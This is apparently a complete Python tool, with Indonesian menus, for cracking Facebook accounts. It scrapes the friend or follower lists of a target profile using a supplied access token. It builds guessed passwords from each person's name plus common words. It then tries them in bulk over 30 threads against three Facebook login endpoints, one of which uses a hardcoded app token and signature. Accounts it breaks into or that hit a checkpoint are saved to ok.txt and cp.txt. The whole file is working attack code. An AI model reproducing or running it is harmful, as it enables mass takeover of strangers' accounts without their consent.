#!/usr/bin/python3
#-*-coding:utf-8-*-
# Code By Riukha Xhein (RXHN♰)

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures
from random import randint
from urllib.parse import quote
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

###Logo###

def banner():
    print("""
    """)

mb = "https://mbasic.facebook.com"
host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None
ua = "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; F5121 Build/34.0.A.1.247) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/537.36"
ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)')]
#NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)
#Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")

### LOGIN METHODE ###

#def logs():
  #os.system("clear")
  #banner()
  #print(("\n[1] Login Token"))
  #sek=input("\n[?] Pilih : ")
  #if sek=="":
    #print(("\n[!] Isi Yang Benar!"))
    #logs()
  #elif sek=="1":
    #log_token()

###Login###

def log_token():
    os.system("clear")
    banner()
    toket = input("\n[?] Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print(("\n[+] Berhasil"))
        bot_follow()
    except KeyError:
        print(("[!] Token Invalid!"))
        os.system("clear")
        log_token()
def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("\n[!] Token Invalid"))
		log_token()
	#requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #
	menu()

###Menu###

def menu():
    global ua
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print(("[!] Error : %s"%e))
        log_token()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print(("\n[+] Hello     : "+a["name"]))
    print(("[+] Bergabung : "+durasi))
    print(("[+] ID Anda   : "+id))
    print(("[+] IP Anda   : "+ip))
    print
    print(("\n[1] Crack Dari Publik/Teman"))
    print(("[2] Crack Dari File"))
    print(("[3] Cek Hasil Crack"))
    print(("[0] Keluar"))
    choose_menu()

def choose_menu():
	r=input("\n[?] Pilih : ")
	if r=="":
		print(("\n[!] Isi Yang Benar!"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		ress()
	elif r=="0":
		try:
			jalan("\n[+] Terima Kasih Telah Menggunakan Script Ini:)")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print(("[!] Error %s"%e))
	else:
		print(("[!] Isi Yang Benar!"))
		menu()	

#def pilihcrack(file):
  #print(("\n[1] Mulai"))
  #krah=input("[?] Pilih : ")
  #if krah in[""]:
    #print(("[!]Isi Yang Benar!"))
    #pilihcrack(file)
  #elif krah in["1","01"]:
    #crack(file)
  #else:
    #print(("[!]Isi Yang Benar!"))
    #pilihcrack(file)

###Dump Publik###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("\n[!] Cookies/Token Invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		print(("\n[+] Isi 'me' Untuk Crack Dari Teman Sendiri"))
		idt = input("[?] ID Publik : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("[+] Nama      : "+op["name"]))
		except KeyError:
			print(("[!] ID Tidak Tersedia!"))
			print(("\n[Kembali]"))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("[+] Total ID  : %s"%(len(id))))
		return crack(qq)
	except Exception as e:
		exit("[!] Error : %s"%e)

###Dump Follow###

def follow():
	try:
		files=input("[?] Masukan File : ")
	except IOError:
		print(("\n[!] Cookies/Token Invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		idt = input("[?] ID Publik : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("[+] Name     : "+op["name"]))
		except KeyError:
			print(("[!] ID Tidak Tersedia!"))
			print(("\n[Kembali]"))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("[+] Total ID : %s"%(len(id))))
		return crack(qq)
	except Exception as e:
		exit("[!] Error : %s"%e)

###List Sandi###

def generate(text):
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				results.append("anjing")
				results.append("bangsat")
				results.append("sayang")
				results.append("bismillah")
				results.append("rahasia")
				results.append("indonesia")
				results.append("sayangku")
				results.append("katasandi")
	return results

###Waktunya Crot###

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
	
def apiapi(em,pas,hosts):
	r=requests.Session()
	ue = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
	heder = {"user-agent": ue,
	"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
	"x-fb-sim-hni": str(random.randint(20000, 40000)),
	"x-fb-net-hni": str(random.randint(20000, 40000)),
	"x-fb-connection-quality": "EXCELLENT",
	"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
	"content-type": "application/x-www-form-urlencoded",
	"x-fb-http-engine": "Liger"
	}
	param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
		'format': 'json', 
		'sdk_version': '2', 
		'email': em, 
		'locale': 'en_US', 
		'password': pas, 
		'sdk': 'ios', 
		'generate_session_cookies': '1', 
		'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
	api = 'https://b-api.facebook.com/method/auth.login'
	response = r.get(api, params=param, headers=heder)
	if 'session_key' in response.text and 'EAAA' in response.text:
		return {"status":"success","email":em,"pass":pas}
	elif 'www.facebook.com' in response.json()['error_msg']:
		return {"status":"cp","email":em,"pass":pas}
	else:return {"status":"error","email":em,"pass":pas}

def m_log(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def bas_log(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p = r.get("https://mbasic.facebook.com")
	b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
	if "c_user" in r.cookies.get_dict().keys():
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
		return {"status":"success","email":em,"pass":pas,"cookies":kuki
		}
	elif "checkpoint" in r.cookies.get_dict().keys():
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
		return {"status":"cp","email":em,"pass":pas,"cookies":kuki}
	else:return {"status":"error","email":em,"pass":pas}
class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(("\n[+] Apakah Ingin Menggunakan Password Manual? [y/t]"))
		while True:
			f=input("[?] Pilih : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print(("[+] Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print ('\n[1] Api (Fast)\n[2] Mbasic (Slow)\n[3] Mobile (SupSlow)')
				metod = input('[?] Pilih : ')
				if '1' in metod:
					print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
					ThreadPool(30).map(self.main_api,self.fl)
				elif '2' in metod:
					print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
					ThreadPool(30).map(self.main,self.fl)
				elif '3' in metod:
					print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
					ThreadPool(30).map(self.main_mb,self.fl)
				else:
					 exit()
				#print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
				#ThreadPool(30).map(self.main,self.fl)
				#os.remove(self.apk)
				#exit()
				break
	def pwlist(self):
		self.pw=input("[?] Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ('\n[1] Api (Fast)\n[2] Mbasic (Slow)\n[3] Mobile (SupSlow)')
			metod = input('[?] Pilih : ')
			if '1' in metod:
				print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
				ThreadPool(30).map(self.main_api,self.fl)
			elif '2' in metod:
				print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
				ThreadPool(30).map(self.main,self.fl)
			elif '3' in metod:
				print(("\n[+] Hasil [OK] Tersimpan Di : ok.txt""\n[+] Hasil [CP] Tersimpan Di : cp.txt\n[+] Mode Pesawat 1 Detik Jika Tidak Ada Hasil !!!\n"))
				ThreadPool(30).map(self.main_mb,self.fl)
			else:
				exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\x1b[0;32m[OK] %s | %s               "%(fl.get("id"),i)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r\x1b[0;33m[CP] %s | %s               "%(fl.get("id"),i)))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m[><] %s/%s OK: %s - CP: %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
	def main_api(self,fl):
		try:
			for i in fl.get("pw"):
				log=apiapi(fl.get("id"),
					i,'https://b-api.facebook.com/method/auth.login')
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[CP] %s | %s               "%(fl.get("id"),i)))
					#check_in(fl.get("id"),i)
					open('cp.txt','a').write(fl.get('id')+'|'+i+'\n')
					self.cp.append("%s | %s"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[OK] %s | %s               "%(fl.get("id"),i)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open('ok.txt','a').write(fl.get('id')+'|'+i+'\n')
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m[><] %s/%s OK: %s - CP: %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
	def main_mb(self,fl):
		try:
			for i in fl.get("pw"):
				log=check_log(fl.get("id"),i)
				if log.get("status")=="success":
					print(("\r\x1b[0;32m[OK] %s | %s               "%(fl.get("id"),i)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r\x1b%s\n[0;33m[CP] %s|%s\n%s"%('-'*30, fl.get("id"),i,log.get('opsi'))))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m[><] %s/%s OK: %s - CP: %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
			
			
def check_log(em, pas):
	ses = requests.Session()
	#-> anak anak kontol yang gak punya argument jangan bilang banyak kali memek
	#-> Buat dapetin bi_xrwh
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":em,"pass":pas})
	try:
		run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print("[!] Redirect overload")
	if "c_user" in ses.cookies:
		return {"status":"success","email":em,"pass":pas}
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		#print("[!] FOUND "+str(len(ngew))+" OPSI ")
		for opt in range(len(ngew)):
			return {"status":"cp","email":em,"pass":pas,"opsi":'['+str(opt+1)+'] '+ngew[opt]}
			#print(" "*3, str(opt+1)+". "+ngew[opt])
	#elif "login_error" in str(run):
		#oh = run.find("div",{"id":"login_error"}).find("div").text
		#print("[!] "+oh)
	else:return {"status":"error","email":em,"pass":pas}

			
			
def check_in(user, pasw):
	ses = requests.Session()
	#-> anak anak kontol yang gak punya argument jangan bilang banyak kali memek
	#-> Buat dapetin bi_xrwh
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print("[!] Redirect overload")
	if "c_user" in ses.cookies:
		print("[✓] akun ini tidak checkpoint")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("[!] FOUND "+str(len(ngew))+" OPSI ")
		for opt in range(len(ngew)):
			print(" "*3, str(opt+1)+". "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("[!] "+oh)
	else:
		print("[!] login gagal, silahkan cek kembali id dan password")
		
###Hasil Crack###

def results(Riukha,Xhein):
        if len(Riukha) !=0:
                print(("[OK] : "+str(len(Riukha))))
        if len(Xhein) !=0:
                print(("[CP] : "+str(len(Xhein))))
        if len(Riukha) ==0 and len(Xhein) ==0:
                print("\n")
                print(("[!] Tidak Ada Result"))

def ress():
    os.system("clear")
    banner()
    print(("\n[Result Crack]"))
    print(("\n[OK]"))
    try:
        os.system("cat ok.txt")
    except IOError:
        print(("[!] Tidak Ada Result"))
    print(("\n[CP]"))
    try:
        os.system("cat cp.txt")
    except IOError:
        print(("[!] Tidak Ada Result"))
    input("\n[Kembali]")
    menu()

if __name__=="__main__":
	menu()
